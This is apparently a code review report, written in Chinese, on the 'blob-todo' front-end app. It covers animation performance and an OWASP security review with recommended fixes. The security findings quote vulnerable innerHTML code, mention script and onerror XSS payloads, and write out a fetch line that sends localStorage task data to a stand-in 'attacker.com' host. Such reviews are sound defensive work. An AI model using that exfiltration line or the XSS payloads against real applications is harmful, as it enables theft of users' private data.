# Blob-Todo 架構檢閱與優化報告：效能與安全 (OWASP)

## 1. 執行摘要 (Executive Summary)
本報告針對 `blob-todo` 前端專案進行深入原始碼檢閱，主要聚焦於**減少泡泡動態運算過高帶來的效能瓶頸**，以及**防範前端個資暴露之安全隱患**。
經檢閱發現，專案在動態運算部分存在每幀高密度的 O(N) 及正餘弦（Math.sin/cos）計算；在安全面，發現了數處可能導致使用者任務（含潛在個資）遭注入惡意腳本的 Cross-Site Scripting (XSS) 漏洞。

---

## 2. 效能優化檢閱 (Performance Optimization)

### 2.1 發現的問題：泡泡動態運算過高
在 `app.js` 內的 `PhysicsEngine` 負責處理所有泡泡的物理運動與變形動畫，其核心瓶頸如下：
1. **過多的迭代次數 (Iterations)**
   - 目前 `ITERATIONS = 5`，這意味著在每一幀（通常為 60fps），物理引擎會重複執行高密度的碰撞檢查與邊界反彈高達 5 次。
2. **頂點彈性波浪運算 (Vertex Elasticity) 消耗過高**
   - 每個泡泡包含 8 個頂點 (`points`)，每個頂點在每一幀都使用 `Math.sin` 和 `Math.cos` 進行多次有機變形運算（`wave1` 與 `wave2` 疊加）。這造成了極大量的浮點運算負荷。
3. **網格碰撞偵測 (Spatial Hashing)**
   - 雖有實作 Spatial Hashing，但在高數量泡泡或小視窗時，網格重疊度高，仍會退化成大量 O(N) 的距離與平方根計算 (`Math.sqrt`)。

### 2.2 效能優化建議
- **降低迭代次數**：將 `ITERATIONS` 降低至 `1` 或 `2`。對於視覺特效為主的 UI，物理精確性並非首要，稍有交疊可容忍。
- **快取三角函數或減少計算**：將 `wobbleTime` 的正弦/餘弦結果預先計算並存入 Lookup Table，或簡化變形公式；也可以針對「未出現在視窗內」或「幾乎靜止」的泡泡停止運算 (Sleep state)。
- **限制最高幀率或使用節流**：在背景運作或不可見時暫停 `requestAnimationFrame`。

---

## 3. 安全性檢閱 (Security & OWASP Assessment)

針對避免前端個資不當使用與減少隱患，本次針對前端實作進行了 OWASP (Open Web Application Security Project) 原則檢閱。

### 3.1 發現的問題：Stored XSS (OWASP Top 10 - A03:2021-Injection)
當使用者在任務中輸入個資（如：姓名、帳號、憑證等）時，若輸入被惡意竄改或夾帶腳本，將在特定 UI 觸發執行（Cross-Site Scripting）。

**具體漏洞位置：**
1. **歷史管理員 (History Manager, app.js L660)**
   ```javascript
   list.innerHTML = deleted.map(t => `
     ... <div style="font-weight:600; color:var(--text);">${t.title}</div> ...
   `).join('');
   ```
   **風險**：`t.title` 被直接安插於字串模板並丟給 `innerHTML`。若任務標題包含 `<script>` 或 `<img onerror=...>`，當用戶打開歷史紀錄時，惡意腳本將被直接執行，竊取本機 `localStorage` 內的所有任務資訊並外洩。
   
2. **麵包屑導航 (Breadcrumb, app.js L628)**
   ```javascript
   breadcrumb.innerHTML = `...<span class="current">${parentTask.title}</span>`;
   ```
   **風險**：進入子任務時，父任務的標題會被直接轉為 HTML 寫入 DOM，同樣引發 XSS。

### 3.2 發現的問題：敏感資料在地端未加密 (OWASP Top 10 - A02:2021-Cryptographic Failures)
**現狀**：所有待辦事項（包含用戶的筆記 `notes`）都以明文 JSON 格式儲存在 `localStorage` (`blob-todo-tasks`, `blob_todo_history`)。
**風險**：如果發生上述的 XSS 攻擊，攻擊者可以直接寫一行 `fetch('https://attacker.com?data=' + btoa(localStorage.getItem('blob-todo-tasks')))` 來無聲無息地把所有使用者的任務與個資全部偷走。

### 3.3 安全優化建議
- **修復 XSS 漏洞 (最優先)**：將 `innerHTML` 替換為 `textContent` 賦值，或使用安全的 DOM API (`document.createElement`) 來產生元素。絕對避免直接將使用者輸入的 `title` 或 `notes` 嵌入 HTML 模板字串。
- **敏感資料去識別化**：若有強需求儲存敏感個資，應要求使用者設定一組密碼，並利用 Web Crypto API 對 `localStorage` 中的資料進行 AES 加密，確保即便 XSS 被觸發，資料也無法被輕易解讀。

---
## 4. 下一步行動計畫建議
1. 立即著手修復 `app.js` 中的兩處 XSS (`innerHTML` 漏洞)。
2. 將 `ITERATIONS` 調整為 `2` 並將三角函數計算適度簡化，觀察視覺是否有感退化，若無則可大幅減輕 CPU/GPU 負擔。

報告檢閱完畢。
